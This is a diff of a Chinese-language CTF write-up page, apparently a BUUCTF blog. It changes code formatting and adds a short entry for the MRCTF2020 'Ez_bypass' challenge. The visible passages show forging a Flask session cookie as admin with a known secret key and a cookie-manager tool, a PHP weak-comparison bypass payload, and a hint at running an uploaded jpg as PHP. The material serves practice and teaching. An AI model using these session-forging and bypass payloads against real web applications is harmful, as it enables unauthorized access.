@@ -674,10 +674,10 @@
 <span class="token comment">#解密得到：{'_fresh': True, '_id': b'd36b0289542c58199f0077265e16573dce66036e3543284e1c3b4be2fbeeb15674be6453b16bf51b3acbb744a96506026944dc1b663f8adb7673c5ebaceeb6be', 'csrf_token': b'16c4ef7f11713de97039735f894c40b4846df5de', 'image': b'j6il', 'name': '1', 'user_id': '11'}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>然后把name的值改为admin，在使用密钥加密一下得到session值。加密脚本（也可以解密）：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">git clone https://github.com/noraj/flask-session-cookie-manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p>然后使用命令：</p>
-<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python<span class="token punctuation">{</span><span class="token number">2,3</span><span class="token punctuation">}</span> flask_session_cookie_manager<span class="token punctuation">{</span><span class="token number">2,3</span><span class="token punctuation">}</span>.py encode -s <span class="token string">'.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d'</span> -t <span class="token string">'{"number":"326410031505","username":"admin"}'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ python{2,3} flask_session_cookie_manager{2,3}.py encode -s '.{y]tR&amp;sp&amp;77RdO~u3@XAh#TalD@Oh~yOF_51H(QV};K|ghT^d' -t '{"number":"326410031505","username":"admin"}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054287.png"></p>
 <p>将加密后的session重新添加到cookie中得到flag：</p>
@@ -841,6 +841,7 @@ SetHandler application/x-httpd-php<span aria-hidden="true" class="line-numbers-r
 <p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202070953868.png"></p>
 <p>之后直接连接jpg文件就可以了，flag在根目录：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202070953870.png"></p>
+<h2 id="27-MRCTF2020-Ez-bypass"><a href="#27-MRCTF2020-Ez-bypass" class="headerlink" title="27.[MRCTF2020]Ez_bypass"></a>27.[MRCTF2020]Ez_bypass</h2><p>这题比较简单，就是弱比较。直接给payload：/?gg[]=1&amp;id[]=2。然后post的数据为：passwd=1234567a😉</p>
 <hr>
 <img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu3/202202041054294.jpg" style="zoom:150%;">
 
